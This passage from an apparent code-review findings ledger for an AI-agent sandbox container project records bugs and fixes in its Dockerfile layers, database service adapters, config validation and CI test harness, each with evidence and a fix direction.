  WARNING: POSTGRES_DATABASES: '' is not name or name:owner (lowercase letters, digits, _) — skipped
  ; roles: app_user, other; databases: db1
  ```
- Fix direction: add `[[ -n "$name" ]] || continue` (and the same on the trimmed entry) to both loops, as mysql.sh does.


### SVC-4: MariaDB's character-set probe reads an app's `MYSQL_HOME` and the sandbox user's `~/.my.cnf`
- **Status: FIXED** (2026-10-27). The probe is now `"$MYSQL_MYSQLD" --defaults-file="$MARIADB_DEFAULTS" --print-defaults`, the file `/etc/mysql/my.cnf` (`AI_SERVICES_MARIADB_DEFAULTS_FILE` for the tests). The path was checked for both shapes: Ubuntu 24.04's 10.11 and MariaDB's 11.4 (the official `mariadb:11.4` image, built from MariaDB's repository) each have it as an alternatives link to `mariadb.cnf`, and with `MYSQL_HOME` pointing at a `character-set-server=bogus` file and the same line in `~/.my.cnf`, the bare probe printed `bogus` twice, the fixed one the package's options only. The hermetic fake now answers a probe without `--defaults-file` as the real one does; D4 asserts the file and the absence of the app's value, red on the old adapter. The falsify target scores 12 killed of 12. Mutation `813-mariadb-port-from-app-env` was regenerated for the moved context. The review of this fix found no HIGH or MEDIUM; its LOW left open is SVC-5.
- Found by the review of batch 5, LOW-1; predates batch 5
- Severity: LOW — Confidence: CONFIRMED (measured in ubuntu:24.04 with mariadb-server 10.11)
- Location: `services.d/mariadb.sh: svc_start()`, the `"$MYSQL_MYSQLD" --print-defaults` call that reads back the package's character-set options.
- What's wrong: that call has neither `--no-defaults` nor `--defaults-file`, so it also reads `$MYSQL_HOME/my.cnf` or `$MARIADB_HOME/my.cnf` (both settable from `container.env`) and `~/.my.cnf`. A `character-set-server`/`collation-server` there is kept by the `mapfile`, comes later on `mariadbd`'s command line and wins; a bad value stops the server from starting.
- Evidence: with `[mysqld] character-set-server=bogus` in `/tmp/mh/my.cnf`, `MYSQL_HOME=/tmp/mh mariadbd --print-defaults` printed `--character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci --character-set-server=bogus …`; with `--defaults-file=/etc/mysql/my.cnf` added, only the package's two.
- Fix direction: `--defaults-file=/etc/mysql/my.cnf --print-defaults` (made overridable for the tests, like the adapter's other paths), after checking that path for a pinned series from MariaDB's own repository, which the review did not.

## 6. Build, Dockerfile, tools.d and config validation

### BLD-1: db-clients=mongo layer can fail and still report a successful build
- **Status: FIXED (batch 6)** — `1aea53e` (the arm fails the layer, `--error-on=any`, `test -x /usr/bin/mongosh`); `tests/test-dockerfile-layers.sh` runs the layer's own text; the real layer installed mongosh 2.14.0 in ubuntu:24.04.
- Severity: MEDIUM — Confidence: CONFIRMED (shell semantics reproduced; not run in a docker build). **Triage correction:** the failure is silent only when a step *before* the final `apt-get install` fails (key fetch, `gpg --dearmor`, writing the list). The final `apt-get install` is the last command of the `&&` list, so `set -e` does stop on it: an "Unable to locate package" after a plain `apt-get update` that ignored a broken repo **does** fail the build. The fix direction is unchanged.
- Location: `Dockerfile: \`apt-get update && apt-get install -y --no-install-recommends mongodb-mongosh ;;\`` (DB_CLIENTS layer)
- Introduced: 286790e (pre-window). The window touched the neighbouring mongo work (e3c9b15) without fixing it.
- What's wrong: The `mongo)` arm is one `&&` list: `curl … | gpg --dearmor … && echo … > list && apt-get update && apt-get install … mongodb-mongosh`. Under `set -e`, bash ignores a failure anywhere in an `&&` list except the last command. The list also sits inside a `for`/`case`, and `; done; rm -rf /var/lib/apt/lists/*;` runs after it. So the layer's exit status is the `rm`'s, which is 0. The pg and mysql arms are single simple commands, so `-e` does stop on those.
- Failure scenario: `db-clients=mongo`, and any step of the arm fails. Examples: pgp.mongodb.com still failing after 5 retries, a gpg error, or repo.mongodb.org not loading. Plain `apt-get update` exits 0 when that happens, and the next `apt-get install` fails with "Unable to locate package". Every one of these ends with `docker build` succeeding, an image with no `mongosh`, and the build toolchain still kept. The `mongo=` server layer just below uses `--error-on=any` and `test -x /usr/bin/mongosh` to fail closed in exactly this situation.
- Evidence: `bash -euo pipefail -c 'for c in mongo; do case "$c" in mongo) false | cat && echo next ;; esac; done; echo "REACHED rm"'` prints `REACHED rm` and exits 0.
- Fix direction: Make the arm fail the layer, either `( … ) || exit 1` around it or `… || { echo "mongosh install failed" >&2; exit 1; }`. Also add `--error-on=any` and a final `test -x /usr/bin/mongosh`, as the server layer does.

### BLD-2: SDKMAN multi-version installs: a bad version that is not last is silently skipped
- **Status: FIXED (batch 6)** — `1aea53e` (`|| exit 1` in all seven SDKMAN loops; real SDKMAN returns 1 for an unknown version, checked by the review); `tests/test-dockerfile-layers.sh`, made discriminating in `05fec4f`.
- Severity: MEDIUM — Confidence: PLAUSIBLE (loop semantics reproduced; `sdk install`'s exit code on an unknown version not run here)
- Location: `Dockerfile: \`for ver in $OPENJDK_VERSIONS; do sdk install java \${ver}-tem; done"\`` (the same pattern is in the graalce, graal, kotlin, scala, maven and gradle layers)
- Introduced: 8c4bd08 (pre-window, untouched ancient code)
- What's wrong: Each loop runs inside a nested `bash -c "…"`. That child bash does not inherit the Dockerfile `SHELL`'s `-e`, so the loop's status is the status of its last iteration. `validate_config` only checks that each version contains a `.`.
- Failure scenario: `openjdk=21.0.5,17.0.99` (a typo in a version that is not first), or `maven=3.9.9,3.9.99`. The bad `sdk install` prints "Stop! … is not available" and returns non-zero. The next iteration succeeds, the layer is green, and the image lacks the version `sandbox.conf` asked for. A bad *first* openjdk/graal version is caught only by accident, by the later `sdk default java <first>`. A bad version for kotlin/scala/maven/gradle is caught only when it is the last in the list.
- Evidence: `bash -euo pipefail -c 'bash -c "for v in bad good; do [ \$v = good ]; done" && echo "layer would succeed"'` prints `layer would succeed`.
- Fix direction: Use `bash -ec "…"`, or `sdk install … || exit 1` inside each loop.

### BLD-3: install=repo-file installs the binary as mode 0711 (not readable by the agent)
- **Status: FIXED (batch 6)** — `aeffa17` (every install path sets 0755); `tests/test-tools-d.sh`. See BLD-8 for the assertions.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if ! mv "$tmp" "$dest" || ! chmod +x "$dest"; then\`` in `install_repo_file()`
- Introduced: in the window, with the repo-file install path
- What's wrong: `tmp` comes from `mktemp`, which creates the file 0600. `mv` keeps that mode, and `chmod +x` under umask 022 only adds the x bits, giving 0711. The sandbox user, who is not root, can execute an ELF file at that mode but cannot read it. A script binary (shell, Python zipapp) fails with `Permission denied`, and `file`, `sha256sum` and copying the binary also fail. `install_url` gets 0755 only because curl creates its file under the umask. This is latent in this repo, which ships no repo-file tool, but live in the mgd port (acli-pii is install=repo-file). `tests/test-tools-d.sh` checks only `-x` as the owner, so it cannot see the problem.
- Evidence: fake curl plus `TOOL_VERSIONS=pub=latest` with an `install=repo-file` descriptor → `stat -c %a` on the installed binary prints `711`.
- Fix direction: `chmod 0755 "$dest"` (or use `install -m 0755`). Add a test that asserts the other-read bit is set.

### BLD-4: Private release path still falls back to an anonymous API request with a stale token
- **Status: FIXED (batch 6)** — `d4383c1` (`api_get … required` from the private release branch).
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if [ -z "$body" ] && [ -n "${AUTH_ARGS[*]+set}" ] && [ "${#AUTH_ARGS[@]}" -gt 0 ]; then\`` in `api_get()`, called from the `private=yes` branch of `install_one()`
- Introduced: in the window (anonymous fallback in aa662ad; c4abf76 fixed only `install_repo_file`)
- What's wrong: The file's own rule says "ONLY WHERE THE TOKEN IS OPTIONAL … the private release-asset path therefore has no fallback". c4abf76 applied that rule to repo-file. `api_get` still makes the anonymous retry for every caller, including private release resolution.
- Failure scenario: a `private=yes` release tool with a stale or un-SSO'd token. There are 3 authenticated attempts, then one anonymous request that cannot succeed. The build then prints "API request failed with a credential; retrying anonymously (is GITHUB_TOKEN stale?)", which is the misleading diagnostic c4abf76 removed elsewhere.
- Evidence: fake curl that always fails, descriptor `repo=acme/secret private=yes`, `GITHUB_TOKEN=stale`. The call log shows 3 calls with `Authorization` and a 4th without it.
- Fix direction: Pass a "no anonymous fallback" flag to `api_get` from the private branch, or check `TOOL_private` inside it.

### BLD-5: AGENTS.md says a pinned acli value is "refused"; it is installed as latest with a NOTE
- **Status: FIXED (batch 6)** — `7e1771a` (a pin of an `install=url` tool without `${VERSION}` is refused; `latest` accepted in `05fec4f`); `tests/test-validate-config.sh`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`echo "NOTE: ${name}=${version} cannot be pinned: its url= has no \${VERSION} placeholder." >&2\``; `build.sh: \`tool_versions_arg()\``; AGENTS.md: "so its grammar is `ON | OFF` and a pinned value is refused rather than silently ignored"
- What's wrong: Nothing refuses the value. `validate_config` has no tools.d check, and `tool_versions_arg` passes `acli=1.3.22` through. `install_url` prints a NOTE that is easy to miss in the build log, then installs whatever `/latest/` currently serves. A user who reads AGENTS.md will think a pin was either honoured or rejected.
- Evidence: `sandbox.conf` with `acli=1.3.22` → `validate_config` passes and `tool_versions_arg` → `acli=1.3.22;…`.
- Fix direction: Refuse a non-ON/OFF value in `validate_config` for a tool whose `url=` has no `${VERSION}` (and whose install is not release), or correct AGENTS.md to describe the NOTE behaviour.

### BLD-6: A lowercase `off`/`on` passes validation for most keys; `ruby=off` brings back the exact ruby=OFF defect
- **Status: FIXED (batch 6)** — `7e1771a`, moved into `check_config` (which `sandbox.sh` runs too, since ruby installs at run time) in `05fec4f`; `tests/test-validate-config.sh`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`has_versions()\`` / `version_list()` (they normalise only the literal `OFF`); `build.sh: \`validate_config()\`` (case-checks only playwright and the server keys)
- What's wrong: The OFF normalisation compares against the literal `OFF`, and `validate_config` adds case checks only for playwright, postgres, redis, mysql, mongo and mariadb.
- Failure scenario:
  - `ruby=off`: `has_versions ruby` is true. That gives KEEP_BUILD_TOOLCHAIN=1, RUBY_RUNTIME=1, `RUBY_VERSIONS=off` in the container and an rvm volume, and `rvm install off` fails on every start. This is exactly the failure AGENTS.md describes for `ruby=OFF`.
  - `dtctl=on`: `TOOL_VERSIONS=dtctl=on`, then download tag `von`, a non-fatal WARNING, and an image without dtctl.
  - `c-toolchain=on`: silently OFF.
  - rust, go, node and python with `off` fail the build loudly, so they cause no silent harm.
- Evidence: `sandbox.conf` with `ruby=off dtctl=on c-toolchain=on` → `validate_config` passes, `tool_versions_arg` prints `dtctl=on`, `is_enabled c-toolchain` is false, and `version_list ruby` prints `off`.
- Fix direction: Apply the playwright-style "must be written in capitals" check generically to every key whose value case-folds to ON/OFF.

### BLD-7: AGENTS.md says rust and go accept comma-separated version lists; they accept one value
- **Status: FIXED (batch 6)** — `7e1771a` (a list is refused for rust and go; AGENTS.md corrected).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: AGENTS.md: "Version-list components (`node`, `python`, `ruby`, `rust`, `go`) accept comma-separated version values"; `build.sh: \`_args+=(--build-arg "GO_VERSION=$ver")\`` and `RUST_TOOLCHAIN=$ver`
- What's wrong: Neither value is split. `go=1.24.2,1.23.1` produces `https://go.dev/dl/go1.24.2,1.23.1.linux-amd64.tar.gz`, a 404. `rust=stable,nightly` gives `rustup --default-toolchain "stable,nightly"`. `validate_config` does not reject the comma, as it does for angular-cli and playwright. `sandbox.conf`'s own comments describe a single value.
- Failure scenario: a user follows AGENTS.md and the build fails with an error that names a strange URL rather than the key.
- Fix direction: Correct AGENTS.md, and add a comma refusal for rust and go in `validate_config`.


### BLD-8: Leftovers of the batch 6 reviews
- **Status: PARTLY FIXED** (2026-10-28). Fixed: the `install=url` mode assertion runs under `umask 077`, where a `chmod +x` revert gives 0700, and the release path has one now (`tests/test-tools-d.sh`, a pinned `rel` descriptor and a fake `curl`); both red with `chmod +x`. The per-key lowercase messages in `build.sh: validate_config()` (playwright, postgres, mongo, mariadb, and `validate_server_on_off()` for redis and mysql) are deleted, and the five server tests and the playwright one run `check_config; validate_config` as `build_image()` does, so they assert the message a user sees. `check_config` refuses an unreadable `sandbox.conf` by name (`tests/test-validate-config.sh`, non-root; red on the old code, which passed it with every key unset). Left open: the per-key `check_config` loop's cost, the CHANGELOG line for release time, and the `--error-on=any` trade, which is the same one the server layers make.
- Severity: LOW/NIT
- The `install=url` 0755 assertion does not catch a revert to `chmod +x`: the archive member is 0644 and the test runs under umask 022, so `+x` gives 0755 too. Run that install under `umask 077` (or make the member 0600). The release path's chmod has no mode assertion at all.
- `check_config` now runs before `validate_config`, so the per-key lowercase messages in build.sh (playwright, postgres, redis, mysql, mongo, mariadb) are unreachable from `./build.sh`; users get the generic one, which still names the key. The per-server tests call `validate_config` alone and so assert messages no user sees. Delete the branches and route those tests through `check_config; validate_config`, or mark them unreachable.
- The per-key loop in `check_config` costs ~0.1 s per launch and build on Linux (one `get_versions` fork set per key), likely more on macOS; a single pure-bash pass would do.
- An unreadable sandbox.conf passes `check_config` (it tests `-f` only).
- A synced project with a latent lowercase build-time key (`c-toolchain=on`) can no longer launch until it is fixed (intended; the message gives the corrected line). Worth a CHANGELOG line at the next release.
- `--error-on=any` on the db-clients=mongo arm fails the build on any broken apt source (the same trade the PGDG, MariaDB and MongoDB server layers make).

### BLD-9: a Node LTS release day can fail every image build for hours: nvm finds no checksum to compare
- **Status: OPEN** (2026-10-28, seen in CI)
- Severity: LOW. Confidence: CONFIRMED (Integration on `7652fb5` and `7b9314d`, 17:14 and 17:37 UTC; the build log in the `it-diagnostics` artifact)
- Location: `Dockerfile: nvm bootstrap failed after 5 attempts`, the nvm layer's retry loop around `nvm install --lts`
- What's wrong: Node 26.13.0 became LTS ("Lithium") on 2026-10-28. For a while nodejs.org listed it in `index.tab` while nvm found no checksum for its tarball (`Provided checksum to compare to is empty.`), so nvm refused the binary, fell back to a source build, which failed too, and the five attempts (about 2.5 minutes of backoff) all failed the same way. At 18:30 UTC the same layer installed it with `Checksums matched!`. Anyone building the image in that window, not only CI, gets a failed build whose message points at nvm rather than at the release.
- Fix direction: on that message, fall back to the previous LTS line (`nvm install --lts=<previous codename>`, or the newest LTS that `nvm ls-remote --lts` lists before it) and say so, rather than retrying the same release; or note the symptom beside the `GITHUB_TOKEN` advice so a failed build is recognised.

### BLD-10: from Node 26, the image's default node dies at exec: libatomic1 is purged with build-essential
- **Status: FIXED** (2026-10-28). `libatomic1` is installed in the essentials layer, so it is manual and survives both `--auto-remove` purges. Case 310 now runs `node`, `npm` and `npx` (`assert_runs`, which needs `--version` to execute); new mutation `311-libatomic-not-installed` drops the package, and against it case 310 fails on exactly `node`, `npm` and `npx` ("libatomic.so.1: cannot open shared object file") while the other eleven tools pass, on an image built with `--no-cache` (a cache from before 2026-10-28 hands back Node 24 in the nvm layer and the case passes, which the patch header now says). The fixed tree passes cases 000, 310 and 440, whose node servers had never listened. Its review measured the rest: Node 26.13.0 needs `libatomic.so.1` on linux-x64 and linux-arm64 alike (Node 24.22.2 on neither) and nothing else noble lacks; under it qmd, yarn, pnpm, bun, Angular CLI and the Copilot, Codex and Gemini CLIs install and run; nothing in the engine pins the Node major.
- Severity: HIGH. Confidence: CONFIRMED (Integration's re-run on `7b9314d`: every case with a node sidecar, and 440's dev server, timed out; reproduced in ubuntu:24.04)
- Location: `Dockerfile: libatomic1`, in the essentials layer; the cleanup layer's `apt-get purge -y --auto-remove`
- What was wrong: Node 26 became the LTS on 2026-10-28, and its official binaries link `libatomic.so.1`, which ubuntu:24.04 does not ship. The nvm layer installs it without running it; the pyenv layer's `build-essential` brings the library in as a gcc dependency, and the cleanup purge removes it again. An image with none of yarn, pnpm, bun, angular-cli or playwright built with a `node` that died at exec ("libatomic.so.1: cannot open shared object file"), taking `npm`, qmd and every npm-installed agent with it; one with any of them failed to build at that layer's `npm`; only `KEEP_BUILD_TOOLCHAIN` images were unaffected. An image built on 2026-10-28 before this fix needs a rebuild.
- Corepack, decided 2026-10-28 (the user, on a measured recommendation): **not installed**. Node 26 no longer bundles it (Node 24 does); nothing in the engine uses it (`link-node-globals.sh` skips it, no layer runs it), and `corepack enable` never worked for the sandbox user, whose nvm directory is root-owned. Measured as a non-root user in the Node 26 image: `npm install -g corepack` fails `EACCES`; `npx corepack` (0.36.0, cached in `~/.npm`, not group-mounted), a project devDependency (persists in the workspace), `npm install -g --prefix ~/.local` (`~/.local/bin` is on PATH, not mounted) and `corepack enable --install-directory ~/bin` with a pinned `pnpm@9.15.0` all work. The routes are in `docs/components/README.md`; `node=24` gives a project the bundled one. Group-mounting `~/.npm` would make npm's cache and `npx` persist, a separate, optional change.

## 7. Test harness and CI

### TST-1: Hermetic suite fails on a developer host with an en_US.UTF-8 locale (two tests compare a locale `sort` against C-ordered literals)
- **Status: FIXED (batch 7)** — `142dc84`, `aa0c70b` (`LC_ALL=C sort` in both helpers and in `summary_vols`). The `suite` job now runs under `en_US.UTF-8` (asserted to collate differently from C), so the class stays caught; `tests/run-all.sh` deliberately does not pin the locale.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``; `tests/test-falsify-run.sh: \`find "$FR_WORK/w0" -type f 2>/dev/null | sed "s|^$FR_WORK/w0/||" | sort | tr '\n' ' ' )"\``
- Introduced: 92c40dd / 8b9ad30 (2026-08-20/21, test-repo-destructive); the test-falsify-run.sh assertion is in the same class.
- What's wrong: both helpers pipe through a bare `sort`, which follows LC_COLLATE. The expected strings are written in byte (C) order. In en_US.UTF-8, glibc ignores punctuation at the first collation level, so `docs-archive--wc` sorts before `docs--wc` and `a/file1` sorts before `.github/…`. Nothing pins the locale: neither run-all.sh nor the two tests sets LC_ALL. GitHub runners use C.UTF-8, so CI stays green.
- This is a test bug, not a product bug. `repo.sh: \`cmd_gc()\`` removes the same set of volumes either way, and the order has no meaning.
- Failure scenario: on a typical Linux desktop (LANG=en_US.UTF-8), `bash ./verify-on-host.sh` Phase 5 reports "hermetic suite exited 1". Because the symlinked-TMPDIR arm is gated on `h_rc == 0`, that arm then does not run at all.
- Evidence:
  ```
  LC_ALL=en_US.UTF-8 bash tests/run-all.sh repo-destructive
  FAIL: gc --yes removes every working copy, across all repos (expected 'ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|ai-containers-repo-docs-archive--wc-projA|', got 'ai-containers-repo-docs-archive--wc-projA|ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|')
  FAIL: gc --unused keeps the in-use copy …
  full suite under en_US.UTF-8: 98 test(s), 96 passed, 2 failed — test-falsify-run.sh: "a partial cp -a does not nest the seeded tree (expected '.github/workflows/nightly.yml a/file1 ', got 'a/file1 .github/workflows/nightly.yml ')"
  ```
  With LC_ALL=C and with C.UTF-8 both tests pass.
- Fix direction: use `LC_ALL=C sort` in both helpers. Optionally also export `LC_ALL=C` (or `LC_COLLATE=C`) per test in run-all.sh, and add a run under a non-C locale to the suite so the class stays caught.

### TST-2: Layer-containment models nightly wrongly — a PR-selected case that no nightly job runs still passes "PR ⊆ nightly"
- **Status: FIXED (batch 7)** — `be63670` (each layer is the union of one `run.sh --dry-run` per `tests/integration/run.sh` invocation its event runs, read from the workflows by `wf_it_selections()`; nightly must hold the whole corpus; integration.yml's Run step split by event), hardened in `892cdaf` (run: values folded as YAML folds them), `9142ea4`, `931c3fc`, `b3f18d7` and `b0692d7` (an invocation the shell may skip, or in a job with `needs:`, is refused by name). Tests in `tests/test-layer-checks-parser.sh`; the review's planted 799 and the deleted packages-services job both fail the guard.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `tests/test-layer-containment.sh: \`nightly_set="$( { sel --exclude packages; sel --tags packages; } | sort -u )"\``, and `pr_set="$(sel --tags fast --exclude needs-external,needs-dns)"`
- Introduced: 482f30a (pre-window). The window added the `services`/`mariadb` variants and the `packages-services` job without updating the model.
- What's wrong: both selections are hardcoded literals instead of being read from the workflows. `sel --tags packages` covers every variant, but nightly's packages jobs only run `--variant agents|native|services|mariadb`, and `integration-full` excludes `packages`. So the guard credits nightly with cases nightly never runs:
  - a `packages` case with no `# image:` header (the default variant);
  - any variant whose nightly job is deleted.
- PR args are also not derived from integration.yml, so a change there is invisible to the guard.
- Failure scenario: a planted case `799-planted` tagged `packages fast` with no image header is selected by the PR gate (`--tags fast --exclude needs-external,needs-dns`) and by no nightly job, yet test-layer-containment prints `PASS: PR selection ⊆ nightly selection … 0 failure(s)`. Deleting the whole `packages-services:` job (which drops 785/790/800/810 from every CI layer) also leaves the test at 0 failures.
- Evidence: I reproduced both in scratch worktree wt3. The dry-run per nightly variant shows 799 is not run; the containment test reports 0 failure(s). At HEAD every packages case declares a variant, so the breach is latent.
- Fix direction:
  - Derive each layer's run.sh argument lists from the workflow jobs (as wf_job_key does for the hermetic job), and compute nightly as the union of each job's `--dry-run`.
  - Or assert explicitly that `sel --tags packages` equals the union over the variant jobs.

### TST-3: check-ledger excuses a genuine SURVIVOR when any sibling mutant of the same identity was UNPROVEN
- **Status: FIXED (batch 7)** — `e84d08a` (the exemption needs every non-killed record of the identity to be UNPROVEN); `tests/test-falsify-ledger.sh` demonstration 5, both record orders.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced with a synthetic run record)
- Location: `tests/falsify/check-ledger.sh: \`cl_check_run()\``. The relevant code is `if [[ -n "${CL_UNPROVEN[$ident]:-}" ]]; then cl_note "UNPROVEN, not required to be classified: …"`. `cl_read_run()` sets `CL_UNPROVEN[$ident]=1` per identity, not per damage.
- Introduced: 9ce2506 (2026-08-16). The window's ratchet relies on it.
- What's wrong: an identity is `file:operator:sha1(original line)`, and one identity can carry several distinct damages (one line with two `||`, repeated identical lines). The UNPROVEN exemption is keyed on the identity. So if one damage SURVIVED and another merely timed out, the survivor needs no ledger entry and check B never fires. In this run, 149 identities carried more than one mutant, so the case is reachable. It was not hit at HEAD: the one mixed UNPROVEN identity, start-services.sh cond-negate d6e00d…, had a KILLED sibling, not a SURVIVED one.
- Failure scenario: a run whose output holds `MUTANT|SURVIVED|<id>|…` and `MUTANT|UNPROVEN|<id>|…`, checked against an empty ledger with `--strict`, returns `OK: 0 problem(s) … 1 unproven unclassified`, rc 0. Drop the UNPROVEN line and the same SURVIVED record gives `ERROR: … SURVIVED … but has no entry`, rc 1. The exemption depends on load, so a host or CI run under load can hide a real GAP.
- Evidence: repro files are in /tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/tests-ci/cl/ (both rc's shown above). No test in tests/test-falsify-*.sh covers a mixed SURVIVED+UNPROVEN identity.
- Fix direction: exempt only identities where every non-KILLED record is UNPROVEN, i.e. track SURVIVED separately from UNPROVEN and require an entry whenever at least one record is SURVIVED.

### TST-4: tests/integration/minimal-conf.sh lets pinned values of newer keys through, so the developer's sandbox.conf leaks into the corpus images
- **Status: FIXED (batch 7)** — `e09a674` (every key with a value becomes OFF; nvm-version, not a component, becomes empty), plus a per-variant `validate_config` check in `9142ea4`; new `tests/test-minimal-conf.sh`, partly derived from the real sandbox.conf.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/integration/minimal-conf.sh: \`s/^(node|python|ruby|rust|go|openjdk|graalvm-ce|graalvm-oracle|kotlin|scala|maven|gradle|db-clients|angular-cli)=.*/\1=/\``
- Introduced: when `postgres=`, `mariadb=`, `mongo=`, `playwright=` (version grammars) and the tools.d keys landed. None was added to this list.
- What's wrong: only `=ON` values and the listed version-list keys are reset. A pinned value such as `postgres=16`, `mariadb=11.4`, `mongo=8.2`, `playwright=1.50.0` or `dtctl=0.25.0` survives into every variant's config. That contradicts docs/testing.md's "A launcher case never inherits the developer's sandbox.conf".
- Failure scenario: an engine checkout with `mariadb=11.4` builds the `services` variant (`redis=ON mysql=ON mongo=ON`) with mariadb still on. build.sh then refuses: `ERROR: mysql and mariadb are both on; choose one.` → 785/790/800 FAIL as "image variant services failed to build". Separately, `postgres=16` silently adds a PostgreSQL server to the default image and to every launcher case.
- Evidence: `minimal-conf.sh dev.conf redis=ON mysql=ON mongo=ON` emits `postgres=16`, `mariadb=11.4`, `playwright=1.50.0`, `dtctl=0.25.0` unchanged.
- Fix direction: reset every non-empty value of every key to OFF or empty, not only `ON` and a hand-kept list. Or derive the list from build.sh's `validate_config`.

### TST-5: bash-dialect-lint lets post-floor constructs through (`${x@k}`, `${| …;}`, `shopt -s patsub_replacement`)
- **Status: FIXED (batch 7)** — `17b073f` (`@k` in its own 5.2 row, the 5.3 REPLY form, `patsub_replacement`, subscripted and positional/special parameters; regexes may use alternation). The bash 5.1.16 behaviour is in docs/superpowers/to-test.md for the floor container.
- Severity: LOW — Confidence: CONFIRMED (reproduced on ubuntu:22.04 / 24.04)
- Location: `tests/bash-dialect-lint.sh: \`'5 1|case-mod-expansion|\$\{[A-Za-z_][A-Za-z0-9_]*@[UuLKk]\}|case-modifying parameter expansion (@U/@u/@L/@K/@k)'\``, and `'5 3|dollar-brace-space|\$\{[[:space:]]|…'`
- What's wrong:
  - `@k` is bash 5.2. bash 5.1.16 reports `${x@k}: bad substitution`, but `@k` sits in a row tagged 5.1, which is permitted at floor 5.1.
  - bash 5.3's `${| cmd; }` form has no space after `${` and is not matched (bash 5.2 rejects it).
  - The 5.2 `patsub_replacement` shopt (which also changes what `&` means in `${v/p/&}`) has no row.
  - Array forms (`${a[@]@Q}`) are never matched by either expansion rule.
- Failure scenario: a probe file holding `echo "${x@k}"`, `echo "${|REPLY=hi;}"` and `shopt -s patsub_replacement` gives `bash-dialect-lint.sh probe.sh` → rc 0. Under the 5.1 floor container the first line dies.
- Fix direction: split `@k` into a `5 2` row, add `\$\{\|` (5.3) and `patsub_replacement` (5.2) rows, and allow a `[...]` subscript in the expansion regexes.

### TST-6: wf_triggers_on misses three of GitHub's four `on:` spellings, so an `exempt` workflow row's "VERIFIED not pull_request-triggered" claim can be false
- **Status: FIXED (batch 7)** — `6b6873c` (scalar, flow list, sequence and block map at any indentation; rc 2 for what it cannot read, which fails an exempt row), and in `9142ea4` a flow collection on the line after `on:`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/lib-layer-checks.sh: \`wf_triggers_on()\``. It only matches `on:` on its own line followed by a key indented exactly two spaces.
- What's wrong: it misses `on: pull_request`, `on: [push, pull_request]`, `on:` followed by `- pull_request`, and any indentation other than two spaces. test-layer-containment.sh calls this the verification that makes `coverage=exempt` "not merely trusted".
- Failure scenario: a new workflow `on: [push, pull_request]` that runs `./tests/run-all.sh`, registered as `workflow|x.yml|exempt|…`, passes as "verified NOT pull_request-triggered". Its steps are never classified, which is the bypass the registry exists to close.
- Evidence: wf_triggers_on returned "MISSED" for all four fixture spellings (a–d).
- Fix direction: also match the scalar and flow-list forms, and the `- name` sequence form, at any indentation. Or fail an exempt row whose `on:` is not in the one parsed shape.

### TST-7: demonstrate-needs-rebuild.sh `--help` prints the wrong lines; its cleanup leaks services/mariadb images; docs count is stale
- **Status: FIXED (batch 7)** — `59c182d` (`--help` from the `# Usage:` marker; the cleanup removes every tag run.sh's `variant_image()` gives; counts dropped), and in `9142ea4` a shellcheck source directive the full-tree gate needs. New `tests/test-demonstrate-needs-rebuild.sh`; the real interrupt on a Docker host is in docs/superpowers/to-test.md.
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `tests/integration/demonstrate-needs-rebuild.sh: \`-h|--help)         sed -n '68,74p' "${BASH_SOURCE[0]}"; exit 0 ;;\``
  - its `cleanup()`: `docker rmi -f "$IT_IMAGE" "$IT_IMAGE-agents" "$IT_IMAGE-native"`
- What's wrong:
  - `--help` prints the tail of the "NAMING" paragraph and the first Usage line. It is a line-number range, which the repo's own citing rule warns about.
  - The interrupt cleanup names three of the five variant tags, so an interrupted services or mariadb rebuild leaves its multi-GB image behind. run.sh's own per-variant rmi does not run when the script is interrupted.
  - docs/testing.md says the needs-rebuild set is "nine today" and the script header says "all thirty-four". lib-rebuild.sh's predicate selects 36 at HEAD.
- Evidence: output of `bash tests/integration/demonstrate-needs-rebuild.sh --help` (shown above); `patch_needs_rebuild` over mutations/ finds 43 rebuild patches, of which 36 are outside network-mode/delivery.
- Fix direction: print the help from a marker, list the tags with `variant_image` over all known variants, and drop the hardcoded counts.

### TST-8: update-nvm-version.yml PR body claims it changed sandbox.conf
- **Status: FIXED (batch 7)** — `1413b60` (bullet dropped; AGENTS.md and docs/configuration.md reworded), made BSD-sed-safe in `9142ea4`. New `tests/test-nvm-update-workflow.sh` runs the job's own step against a scratch copy.
- Severity: LOW — Confidence: CONFIRMED
- Location: `.github/workflows/update-nvm-version.yml: \`- \`sandbox.conf\` — \`nvm-version\` updated\``
- Introduced: f7cdc3c (2026-08-31). It made the job edit only the Dockerfile and left the PR body template as it was.
- What's wrong: every automated PR tells the reviewer sandbox.conf was changed when it never is. AGENTS.md's "`update-nvm-version.yml` exists solely to keep the key current" is also stale: the key is empty by design now, and the job keeps the Dockerfile ARG current.
- Fix direction: drop the sandbox.conf bullet, and reword the AGENTS.md sentence to say the job maintains `ARG NVM_VERSION`.

### TST-9: The hermetic suite cannot run as root since batch 2, so `suite-floor` and Phase 5's floor container fail 19 tests
- **Status: FIXED (batch 7 follow-up)** — `bf820bd`. `tests/run-all.sh` exports `SANDBOX_UID=1000 SANDBOX_GID=1000` when it runs as root and the run named neither, so the suite still runs as root and the root-only branches still run. test-integration-lib.sh now checks the default identity and an override each on a fresh source of lib.sh, so it no longer depends on what the run exported; test-falsify-historical.sh, whose oracle it is, passes with it. test-launcher-dir-ro.sh T46 passed as root with the export, so the third breakage in "Not the fix" was a non-root effect. Measured as root in `ubuntu:22.04`. New `tests/test-run-all-root-identity.sh` (a fake `id`).
